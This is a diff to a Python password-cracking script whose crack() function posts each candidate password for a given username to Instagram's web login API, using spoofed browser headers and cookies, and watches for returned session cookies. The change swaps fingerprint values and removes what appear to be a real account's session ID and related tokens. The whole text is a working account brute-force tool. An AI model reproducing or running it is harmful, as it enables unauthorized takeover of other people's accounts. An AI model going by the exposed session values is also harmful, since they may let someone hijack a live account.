@@ -108,46 +108,49 @@ def crack(uid, password_list, total_count):
             time_now = int(datetime.now().timestamp())
             enc_password = f"#PWD_INSTAGRAM_BROWSER:0:{time_now}:{pw}"
             cookies = {
+            'datr': 'wDF1aOt9UdNuCskTeplHs7Yx',
             'ig_did': str(uuid.uuid4()).upper(),
-            'datr': '5nVJaQHM2QMcbAVBnTN1nd4f',
-            'wd': '1440x566',
-            'mid': 'aUl15gALAAFW6QEW0QpMl3CLgsAR',
+            'mid': 'aHUxwQALAAEhOjO5lKEpzt85Xu9g',
             'ig_nrcb': '1',
             'ps_l': '1',
             'ps_n': '1',
-            'rur': '"PRN\\05465945188004\\0541798288510:01fe9f1d323fb6560c015d7cc08e037d736f2c35930729894799cb41f855e3a3a4a53a73"',
             'csrftoken': csrftoken,
-            'ds_user_id': '65945188004',
-            'sessionid': '65945188004%3ARIglkfmytxBBi0%3A25%3AAYg8sM15Pm56y5O7zZLXuBt7offZZyjAYOaOwwbs9Q',}
+            'wd': '1155x773',}
             headers = {
-            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:146.0) Gecko/20100101 Firefox/146.0',
-            'Accept': '*/*',
-            'Accept-Language': 'en-US,en;q=0.5',
-            'X-CSRFToken': csrftoken,
-            'X-Instagram-AJAX': '1031477873',
-            'X-IG-App-ID': '936619743392459',
-            'X-ASBD-ID': '359341',
-            'X-IG-WWW-Claim': 'hmac.AR0D-QmKrFmevt2T8TLoQKJceQ9wwpaXbhihagAR_0rds9gI',
-            'X-Web-Session-ID': 'b1hvzn:k75u7m:lwl207',
-            'Content-Type': 'application/x-www-form-urlencoded',
-            'X-Requested-With': 'XMLHttpRequest',
-            'Origin': 'https://www.instagram.com',
-            'Alt-Used': 'www.instagram.com',
-            'Connection': 'keep-alive',
-            'Referer': 'https://www.instagram.com/',
-            'Sec-Fetch-Dest': 'empty',
-            'Sec-Fetch-Mode': 'cors',
-            'Sec-Fetch-Site': 'same-origin',}
+            'accept': '*/*',
+            'accept-language': 'en-IN,en-US;q=0.9,en-GB;q=0.8,en;q=0.7,hi;q=0.6,gu;q=0.5,bn;q=0.4',
+            'content-type': 'application/x-www-form-urlencoded',
+            'origin': 'https://www.instagram.com',
+            'priority': 'u=1, i',
+            'referer': 'https://www.instagram.com/accounts/login/?source=desktop_dynamic_landing_dialog',
+            'sec-ch-prefers-color-scheme': 'dark',
+            'sec-ch-ua': '"Google Chrome";v="143", "Chromium";v="143", "Not A(Brand";v="24"',
+            'sec-ch-ua-full-version-list': '"Google Chrome";v="143.0.7499.170", "Chromium";v="143.0.7499.170", "Not A(Brand";v="24.0.0.0"',
+            'sec-ch-ua-mobile': '?0',
+            'sec-ch-ua-model': '""',
+            'sec-ch-ua-platform': '"Windows"',
+            'sec-ch-ua-platform-version': '"10.0.0"',
+            'sec-fetch-dest': 'empty',
+            'sec-fetch-mode': 'cors',
+            'sec-fetch-site': 'same-origin',
+            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36',
+            'x-asbd-id': '359341',
+            'x-csrftoken': csrftoken,
+            'x-ig-app-id': '936619743392459',
+            'x-ig-www-claim': '0',
+            'x-instagram-ajax': '1031477873',
+            'x-requested-with': 'XMLHttpRequest',
+            'x-web-session-id': '98ab8d:bozgai:ippqsi',}
             data = {
             'enc_password': enc_password,
-            'caaF2DebugGroup': '-1',
+            'caaF2DebugGroup': '0',
             'isPrivacyPortalReq': 'false',
             'loginAttemptSubmissionCount': '0',
-            'optIntoOneTap': 'true',
-            'queryParams': '{"oneTapUsers":"[\\"65945188004\\"]"}',
+            'optIntoOneTap': 'false',
+            'queryParams': '{"source":"desktop_dynamic_landing_dialog"}',
             'trustedDeviceRecords': '{}',
             'username': uid,
-            'jazoest': '23031',}
+            'jazoest': '22841',}
             # Make API request
             response = session.post('https://www.instagram.com/api/v1/web/accounts/login/ajax/', cookies=cookies, headers=headers, data=data)
             wanted = ["ds_user_id", "sessionid"]
